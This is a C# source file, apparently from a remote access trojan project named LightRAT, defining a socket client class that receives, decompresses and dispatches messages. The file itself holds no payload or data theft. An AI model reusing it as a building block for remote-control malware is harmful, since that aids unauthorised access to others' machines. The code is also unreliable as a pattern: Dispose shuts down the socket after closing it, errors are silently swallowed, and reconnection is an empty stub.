using LightRAT.Core.Network.Engine;
using LightRAT.Core.Network.Protocol;
using System;
using System.Net.Sockets;

namespace LightRAT.Core.Network
{
    public class Client : IDisposable
    {
        private MessageFramingProtocol protocol = new MessageFramingProtocol(NetworkSizes.MaxPacketSize);
        private byte[] _receivingBuffer = new byte[NetworkSizes.BufferSize];
        
        public Socket ClientSocket { get; private set; }
        public bool IsDisposed { get; private set; } = false;
        public ClientState CurrentState { get; set; }

        public delegate void ReceiveDataEventHandler(string Data);
        public event ReceiveDataEventHandler ReceiveDataEvent;

        public delegate void StateChangeEventHandler(Client client, ClientState state);
        public event StateChangeEventHandler StateChangeEvent;

        public Client(Socket socket)
        {
            ClientSocket = socket;
            protocol.DataReceivedEvent += MessageFraming_DataReceivedEvent;
        }

        public void StartReceiving()
        {
            ClientSocket.BeginReceive(_receivingBuffer, 0, _receivingBuffer.Length, SocketFlags.None, ReceiveData, null);
        }

        private void MessageFraming_DataReceivedEvent(byte[] obj)
        {
            var decompressed = CryptEngine.Decompress(obj);
            ReceiveDataEvent(decompressed);
        }

        private void ReceiveData(IAsyncResult result)
        {
            try
            {
                ClientSocket.EndReceive(result);
                protocol.Read(_receivingBuffer);
                _receivingBuffer = new byte[NetworkSizes.BufferSize];
                ClientSocket.BeginReceive(_receivingBuffer, 0, _receivingBuffer.Length, SocketFlags.None, ReceiveData, null);
            }
            catch (SocketException ex)
            {
                try
                {
                    TryConnect();
                }
                catch (Exception)
                {
                    //throw;
                }
            }
        }
        private void TryConnect()
        {
            // TODO: Implement this
        }
        public void Dispose()
        {
            if (!IsDisposed)
            {
                _receivingBuffer = null;
                protocol.DataReceivedEvent -= MessageFraming_DataReceivedEvent;
                protocol = null;
                ClientSocket.Close();
                ClientSocket.Shutdown(SocketShutdown.Both);
                ClientSocket.Dispose();
                ClientSocket = null;
                IsDisposed = true;
            }
        }
    }
}
